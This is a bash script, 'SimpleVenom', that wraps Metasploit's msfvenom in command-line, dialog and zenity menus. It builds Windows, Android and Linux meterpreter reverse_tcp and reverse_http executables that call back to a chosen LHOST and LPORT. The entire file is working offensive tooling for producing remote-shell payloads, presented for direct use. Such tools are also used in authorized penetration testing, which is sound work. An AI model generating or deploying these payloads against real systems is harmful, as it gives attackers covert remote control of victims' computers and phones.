#!/bin/bash

# SimpleVenom - Metasploit Payload Generator Wrapper
# Refactored Version
# Authors: ByCh4n & lazypwny
# Version: 2.1

# ----------------------------
# Configuration & Global Vars
# ----------------------------
readonly VERSION="2.0.0"
readonly DEFAULT_LHOST=$(hostname -I 2>/dev/null | awk '{print $1}')
readonly DEFAULT_LPORT="4444"
readonly DEFAULT_NAME="payload"
readonly CWD=$(pwd)

# Colors for Shell Mode
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly NC='\033[0m' # No Color

# ----------------------------
# Helper Functions
# ----------------------------

log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

show_help() {
    echo -e "${GREEN}SimpleVenom v${VERSION}${NC}"
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -g, --gui      Force GUI Mode (uses Zenity)"
    echo "  -t, --tui      Force TUI Mode (uses Dialog)"
    echo "  -s, --shell    Force Shell Mode (CLI)"
    echo "  -v, --version  Show version information"
    echo "  -h, --help     Show this help message"
    echo ""
    echo "If no option is provided, the script attempts to auto-detect"
    echo "the best available interface (GUI > TUI > Shell)."
}

check_dependencies() {
    local missing_deps=0
    
    # Essential
    if ! command -v msfvenom &> /dev/null; then
        log_error "msfvenom is not installed or not in PATH."
        missing_deps=1
    fi

    if [ "$missing_deps" -eq 1 ]; then
        log_info "Please install Metasploit Framework."
        exit 1
    fi
}

# ----------------------------
# Core Logic (Shared)
# ----------------------------

generate_payload_cmd() {
    local platform="$1"
    local payload="$2"
    local lhost="$3"
    local lport="$4"
    local filename="$5"
    local extension="$6"

    local outfile="${CWD}/${filename}.${extension}"
    
    # Ensure cleanup before generating new payload
    if [[ -f "$outfile" ]]; then
        rm -f "$outfile"
    fi
    
    echo ""
    log_info "Generating payload..."
    log_info "Payload: $payload"
    log_info "LHOST: $lhost | LPORT: $lport"
    log_info "Output: $outfile"

    if msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$extension" -o "$outfile"; then
        if [[ -f "$outfile" ]]; then
            log_success "Payload created successfully at: $outfile"
            return 0
        else
            log_error "msfvenom exited successfully but the file was not found at: $outfile"
            return 1
        fi
    else
        log_error "Payload generation failed."
        return 1
    fi
}

# ----------------------------
# Shell Mode
# ----------------------------

run_shell_mode() {
    clear
    echo -e "${YELLOW}SimpleVenom (Shell Mode)${NC}"
    echo "---------------------------"

    # Platform
    echo "Select Platform:"
    echo "1) Windows"
    echo "2) Android"
    echo "3) Linux"
    read -r -p "Choice [1-3]: " p_choice

    case "$p_choice" in
        1) platform="Windows"; ext="exe" ;;
        2) platform="Android"; ext="apk" ;;
        3) platform="Linux"; ext="elf" ;;
        *) echo "Invalid choice"; exit 1 ;;
    esac

    # Payload
    echo -e "\nSelect Payload for $platform:"
    if [[ "$platform" == "Windows" ]]; then
        echo "1) windows/meterpreter/reverse_tcp"
        echo "2) windows/meterpreter/reverse_http"
        options=("windows/meterpreter/reverse_tcp" "windows/meterpreter/reverse_http")
    elif [[ "$platform" == "Android" ]]; then
        echo "1) android/meterpreter/reverse_tcp"
        echo "2) android/meterpreter/reverse_http"
        options=("android/meterpreter/reverse_tcp" "android/meterpreter/reverse_http")
    elif [[ "$platform" == "Linux" ]]; then
        echo "1) linux/x86/meterpreter/reverse_tcp"
        echo "2) linux/x64/meterpreter/reverse_tcp"
        options=("linux/x86/meterpreter/reverse_tcp" "linux/x64/meterpreter/reverse_tcp")
    fi
    # shellcheck disable=SC2162
    read -p "Choice [1-2]: " pay_choice
    local idx=$((pay_choice-1))
    local payload="${options[$idx]}"

    if [[ -z "$payload" ]]; then
        echo "Invalid payload"
        exit 1
    fi

    # LHOST
    # shellcheck disable=SC2162
    read -p "Enter LHOST [$DEFAULT_LHOST]: " lhost
    lhost=${lhost:-$DEFAULT_LHOST}

    # LPORT
    # shellcheck disable=SC2162
    read -p "Enter LPORT [$DEFAULT_LPORT]: " lport
    lport=${lport:-$DEFAULT_LPORT}

    # Filename
    # shellcheck disable=SC2162
    read -p "Enter Filename (without extension) [$DEFAULT_NAME]: " fname
    fname=${fname:-$DEFAULT_NAME}

    generate_payload_cmd "$platform" "$payload" "$lhost" "$lport" "$fname" "$ext"
}

# ----------------------------
# Dialog Mode (TUI)
# ----------------------------

run_dialog_mode() {
    exec 3>&1
    
    # Platform
    PLATFORM=$(dialog --menu "Select Platform" 12 40 3 \
        1 "Windows" \
        2 "Android" \
        3 "Linux" 2>&1 1>&3)
    
    local exit_status=$?
    if [ $exit_status -ne 0 ]; then exit 0; fi

    case "$PLATFORM" in
        1) P_NAME="Windows"; EXT="exe"; P_LIST="windows/meterpreter/reverse_tcp 1 windows/meterpreter/reverse_http 2" ;;
        2) P_NAME="Android"; EXT="apk"; P_LIST="android/meterpreter/reverse_tcp 1 android/meterpreter/reverse_http 2" ;;
        3) P_NAME="Linux"; EXT="elf"; P_LIST="linux/x86/meterpreter/reverse_tcp 1 linux/x64/meterpreter/reverse_tcp 2" ;;
    esac

    # Payload
    PAYLOAD_TAG=$(dialog --menu "Select Payload for $P_NAME" 12 60 4 $P_LIST 2>&1 1>&3)
    # shellcheck disable=SC2181
    if [ $? -ne 0 ]; then exit 0; fi

    local PAYLOAD
    case "$P_NAME" in
        "Windows") if [ "$PAYLOAD_TAG" = "1" ]; then PAYLOAD="windows/meterpreter/reverse_tcp"; else PAYLOAD="windows/meterpreter/reverse_http"; fi ;;
        "Android") if [ "$PAYLOAD_TAG" = "1" ]; then PAYLOAD="android/meterpreter/reverse_tcp"; else PAYLOAD="android/meterpreter/reverse_http"; fi ;;
        "Linux") if [ "$PAYLOAD_TAG" = "1" ]; then PAYLOAD="linux/x86/meterpreter/reverse_tcp"; else PAYLOAD="linux/x64/meterpreter/reverse_tcp"; fi ;;
    esac

    # Settings Form
    if ! VALUES=$(dialog --form "Payload Settings" 12 50 0 \
        "LHOST:" 1 1 "$DEFAULT_LHOST" 1 10 20 0 \
        "LPORT:" 2 1 "$DEFAULT_LPORT" 2 10 20 0 \
        "Name:"  3 1 "$DEFAULT_NAME"  3 10 20 0 \
        2>&1 1>&3); then
        # Cancelled
        exit 0
    fi
    
    local LHOST
    local LPORT
    local FNAME
    LHOST=$(echo "$VALUES" | sed -n 1p)
    LPORT=$(echo "$VALUES" | sed -n 2p)
    FNAME=$(echo "$VALUES" | sed -n 3p)

    clear
    # Handling generation in Dialog mode:
    # Use a temp file to capture output
    local TMP_LOG
    TMP_LOG=$(mktemp)
    
    # Ensure cleanup before generating new payload
    if [[ -f "${CWD}/${FNAME}.${EXT}" ]]; then
        rm -f "${CWD}/${FNAME}.${EXT}"
    fi

    dialog --infobox "Generating payload... This may take a moment." 5 50
    
    if msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$EXT" -o "${CWD}/${FNAME}.${EXT}" > "$TMP_LOG" 2>&1; then
        if [[ -f "${CWD}/${FNAME}.${EXT}" ]]; then
            dialog --title "Success" --msgbox "Payload generated successfully:\n${CWD}/${FNAME}.${EXT}" 8 60
        else
             # shellcheck disable=SC2002
             dialog --title "Error" --msgbox "msfvenom exited 0 but file not found!\n\nDetails:\n$(cat "$TMP_LOG")" 15 60
        fi
    else
        # shellcheck disable=SC2002
        dialog --title "Error" --msgbox "Payload generation failed!\n\nDetails:\n$(cat "$TMP_LOG")" 15 60
    fi
    rm -f "$TMP_LOG"
    
    exec 3>&-
}

# ----------------------------
# Zenity Mode (GUI)
# ----------------------------

run_zenity_mode() {
    # Platform
    PLATFORM=$(zenity --list --title="SimpleVenom" --text="Select Platform" --column="Platform" \
        "Windows" "Android" "Linux" --height=250)
    
    if [[ -z "$PLATFORM" ]]; then exit 0; fi

    case "$PLATFORM" in
        "Windows") 
            EXT="exe"
            PAYLOAD=$(zenity --list --text="Select Payload" --radiolist --column="Pick" --column="Payload" \
                TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http")
            ;;
        "Android") 
            EXT="apk"
            PAYLOAD=$(zenity --list --text="Select Payload" --radiolist --column="Pick" --column="Payload" \
                TRUE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http")
            ;;
        "Linux") 
            EXT="elf"
            PAYLOAD=$(zenity --list --text="Select Payload" --radiolist --column="Pick" --column="Payload" \
                TRUE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x64/meterpreter/reverse_tcp")
            ;;
    esac

    if [[ -z "$PAYLOAD" ]]; then exit 0; fi

    # Settings
    SETTINGS=$(zenity --forms --title="Payload Config" --text="Settings for $PAYLOAD\n(Leave blank to use defaults)" \
        --add-entry="LHOST (Def: $DEFAULT_LHOST)" \
        --add-entry="LPORT (Def: $DEFAULT_LPORT)" \
        --add-entry="Filename (Def: $DEFAULT_NAME)" \
        --separator="|")
    
    if [[ -z "$SETTINGS" ]]; then exit 0; fi

    local LHOST
    local LPORT
    local FNAME
    LHOST=$(echo "$SETTINGS" | cut -d'|' -f1)
    LPORT=$(echo "$SETTINGS" | cut -d'|' -f2)
    FNAME=$(echo "$SETTINGS" | cut -d'|' -f3)

    # Defaults if empty
    LHOST=${LHOST:-$DEFAULT_LHOST}
    LPORT=${LPORT:-$DEFAULT_LPORT}
    FNAME=${FNAME:-$DEFAULT_NAME}

    # Progress bar simulation while running
    (
        echo "10" ; sleep 0.5
        echo "# Generating Payload..." 
        
        # Ensure cleanup before generating new payload
        if [ -f "${CWD}/${FNAME}.${EXT}" ]; then
            rm -f "${CWD}/${FNAME}.${EXT}"
        fi

        # We need to run the command and check result, but zenity progress reads stdout.
        # So we run it silently and report based on exit code, but capturing output is tricky in subshell pipe.
        # Simplified for GUI responsiveness:
        if msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$EXT" -o "${CWD}/${FNAME}.${EXT}" 2>/tmp/msferr; then
             echo "90"
             echo "# Done!" ; sleep 1
        else
             echo "90"
             echo "# Error!" ; sleep 1
        fi
        echo "100"
    ) | zenity --progress --title="Generating..." --auto-close

    if [ -f "${CWD}/${FNAME}.${EXT}" ]; then
        zenity --info --text="Payload Successfully Generated:\n${CWD}/${FNAME}.${EXT}"
    else
        local ERR
        ERR=$(cat /tmp/msferr)
        zenity --error --text="Payload Generation Failed.\n$ERR"
    fi
}

# ----------------------------
# Main Execution
# ----------------------------

main() {
    check_dependencies

    local MODE="auto"

    while [[ $# -gt 0 ]]; do
        key="$1"
        case $key in
            -g|--gui)
                MODE="gui"
                shift
                ;;
            -t|--tui)
                MODE="tui"
                shift
                ;;
            -s|--shell)
                MODE="shell"
                shift
                ;;
            -h|--help)
                show_help
                exit 0
                ;;
            -v|--version)
                echo "SimpleVenom version $VERSION"
                exit 0
                ;;
            *)
                echo "Unknown option: $1"
                show_help
                exit 1
                ;;
        esac
    done

    # Logic to select correct mode
    if [[ "$MODE" == "gui" ]]; then
        if command -v zenity &> /dev/null; then
            run_zenity_mode
        else
            log_error "Zenity not installed. Cannot run in GUI mode."
            exit 1
        fi
    elif [[ "$MODE" == "tui" ]]; then
        if command -v dialog &> /dev/null; then
            run_dialog_mode
        else
            log_error "Dialog not installed. Cannot run in TUI mode."
            exit 1
        fi
    elif [[ "$MODE" == "shell" ]]; then
        run_shell_mode
    else
        # Auto mode
        if command -v zenity &> /dev/null; then
            run_zenity_mode
        elif command -v dialog &> /dev/null; then
            run_dialog_mode
        else
            run_shell_mode
        fi
    fi
}

# Start the script
main "$@"
